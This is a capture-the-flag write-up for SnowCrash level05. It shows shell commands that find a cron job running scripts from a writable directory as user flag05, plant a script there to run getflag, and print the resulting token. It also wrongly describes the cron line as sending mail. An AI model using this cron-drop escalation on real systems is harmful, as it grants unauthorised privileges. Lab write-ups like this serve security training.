```
level05@SnowCrash:~$ ls -la
total 12
dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 .
d--x--x--x  1 root    users    340 Aug 30  2015 ..
-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout
-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc
-r-x------  1 level05 level05  675 Apr  3  2012 .profile
```
Nothing in level05. Time to look around:
```
level05@SnowCrash:~$ find / -user flag05 2>/dev/null
/usr/sbin/openarenaserver
/rofs/usr/sbin/openarenaserver
You have new mail in /var/mail/level05

level05@SnowCrash:~$ ls -la /var/mail/level05
-rw-r--r--+ 1 root mail 58 Sep 15  2022 /var/mail/level05

level05@SnowCrash:~$ cat /var/mail/level05
*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05
```
Some googling tells us that this `*/2 * * * * ` sequence at the beginning is [cron](https://crontab.guru/every-2-minutes) setting mail to be sent every 2 minutes <br />
Inside `/usr/sbin/openarenaserver` is:
```
level05@SnowCrash:~$ cat /usr/sbin/openarenaserver
#!/bin/sh

for i in /opt/openarenaserver/* ; do
        (ulimit -t 5; bash -x "$i")
        rm -f "$i"
done
```
So every 2 minutes this script executes files in `/opt/openarenaserver/` and deletes them. We need to execute `/bin/getflag` as *flag05* and save output into some other file
```
level05@SnowCrash:~$ echo "/bin/getflag > /tmp/lvl05" > /opt/openarenaserver/lvl05

level05@SnowCrash:~$ ls -la /opt/openarenaserver/
total 0
drwxrwxr-x+ 2 root root 40 Sep 14 22:50 .
drwxr-xr-x  1 root root 60 Sep 15  2022 ..

level05@SnowCrash:~$ cat  /tmp/lvl05
Check flag.Here is your token : viuaaale9huek52boumoomioc
```
